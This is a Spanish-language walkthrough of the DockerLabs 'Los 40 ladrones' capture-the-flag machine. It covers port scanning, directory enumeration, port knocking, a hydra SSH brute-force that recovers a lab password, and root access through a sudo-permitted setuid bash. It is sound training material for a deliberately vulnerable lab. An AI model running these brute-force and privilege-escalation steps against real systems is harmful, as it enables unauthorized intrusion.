---
layout: post
title: Los 40 ladrones
date: 2024.07.04
categories: [dockerlabs, ctf, linux, facil]
---

![image](/assets/images/los40/los40.jpg)

Estamos ante un docker que contiene una distribución Linux. Es de nivel fácil y es de la plataforma [dockerlabs](https://dockerlabs.es).

# Enumeración

Ponemos el docker en marcha con el `auto_deploy.sh` que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es `172.17.0.2`. 

Empezamos realizando un escaneo de puertos con `nmap`. Hacemos un escaneo silencioso`-sS`, a todos los puertos `-p-`, que nos de detalles del escaneo `-v`, que no haga ping al host `-Pn`, que no haga resolución de DNS `-n` a nuestra máquina victima `172.17.0.2`:

```bash
$ sudo nmap -sS -p- -Pn -n -v 172.17.0.2
PORT   STATE SERVICE
80/tcp open  http
```

Vemos que solo tiene el puerto **80** abierto. Vamos a realizar otro escaneo con `nmap` pero esta vez para detectar la versión del servicio que este corriendo, `-sV`, y para ejecutar los scripts por defecto para detectar vulnerabilidades, `-sC`:

```bash
$ sudo nmap -sCV -p80 -v 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
```

Vemos que la web es una página por defecto de la instalación de apache. Buscamos directorios y ficheros en el servidor con **feroxbuster**. Buscamos las extensiones **php**, **html** y **txt**:

```bash
$ feroxbuster -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -r -d 2 -x php,html,txt
200      GET      367l      977w    10792c http://172.17.0.2/index.html
200      GET       22l      105w     5952c http://172.17.0.2/icons/ubuntu-logo.png
200      GET      367l      977w    10792c http://172.17.0.2/200      GET        3l       20w      111c http://172.17.0.2/qdefense.txt
```

Encontramos un fichero llamado **qdefense.txt**. Lo descargamos y leemos su contenido:

```bash
$ curl http://172.17.0.2/qdefense.txt
Recuerda llama antes de entrar , no seas como toctoc el maleducado
7000 8000 9000
busca y llama +54 2933574639
```

De el fichero obtenemos que hay un user llamado **toctoc** y una secuencia de números que puede ser una secuencia de **Port Knocking.**  El port knocking es un mecanismo para abrir puertos externamente en un firewall mediante una secuencia preestablecida de intentos de conexión a puertos que se encuentran cerrados. Una vez que el firewall recibe una secuencia de conexión correcta, sus reglas son modificadas para permitir al host que realizó los intentos conectarse a un puerto específico. 

Para instalar en kali el comando knock realizamos lo siguiente: `sudo apt update && sudo apt install -y knockd`

Después golpeamos los puertos en la secuencia que hemos visto:

```bash
$ knock -v 172.17.0.2 7000 8000 9000
hitting tcp 172.17.0.2:7000
hitting tcp 172.17.0.2:8000
hitting tcp 172.17.0.2:9000
```

Realizamos un nuevo escaneo de puertos:

```bash
$ sudo nmap -sS -p- -Pn -n -v 172.17.0.2
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ahora ya tenemos el puerto **22** abierto. Como tenemos un user del sistema vamos a probar a buscar la contraseña de dicho usuario con **hydra**:

```bash
$ hydra -l toctoc -P /usr/share/wordlists/rockyou.txt -t 64 -VIf ssh://172.17.0.2
...
826 of 14344401 [child 12] (0/2)
[22][ssh] host: 172.17.0.2   login: toctoc   password: kittycat
[STATUS] attack finished for 172.17.0.2 (valid pair found)
```

Nos conectamos con la password recién encontrada: 

```bash
$ ssh toctoc@172.17.0.2                 
toctoc@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.11-amd64 x86_64)
```

Vemos si el usuario toctoc puede ejecutar algún comando como **root**:

```bash
toctoc@50a589993c7e:~$ sudo -l
Matching Defaults entries for toctoc on 50a589993c7e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User toctoc may run the following commands on 50a589993c7e:
    (ALL : NOPASSWD) /opt/bash
    (ALL : NOPASSWD) /ahora/noesta/function
toctoc@50a589993c7e:~$
```

Puede ejecutar /opt/bash como root. Como sabemos ejecutando `/opt/bash -p` podemos obtener acceso como **root**. El problema es que en /opt no hay ningún fichero. 

Buscamos por el sistema en busca de algún fichero y encontramos lo siguiente en el fichero **.bashrc**:

```bash
function backdoor(){
        echo 'Tal vez una puerta trasera poco discreta'
        echo '5432 3629 9123'
        echo 'Aparecio......'
}
```

Volvemos a “tocar” los puertos que nos indica:

```bash
$ knock -v 172.17.0.2 5432 3629 9123
hitting tcp 172.17.0.2:5432
hitting tcp 172.17.0.2:3629
hitting tcp 172.17.0.2:9123
```

Y haciendo un listado de **/opt** vemos que ahora si está **bash**:

```bash
toctoc@50a589993c7e:~$ ls -la /opt/
total 1424
drwxr-xr-x 1 root root    4096 Jul  6 05:58 .
drwxr-xr-x 1 root root    4096 Jul  6 05:38 ..
-rwsr-S--- 1 root root 1446024 Jul  6 05:58 bash
```

Lo ejecutamos como **root**: 

```bash
toctoc@50a589993c7e:~$ sudo /opt/bash -p
root@50a589993c7e:/home/toctoc# whoami; hostname; date
root
50a589993c7e
Fri Jul  5 08:20:09 +10 2024
```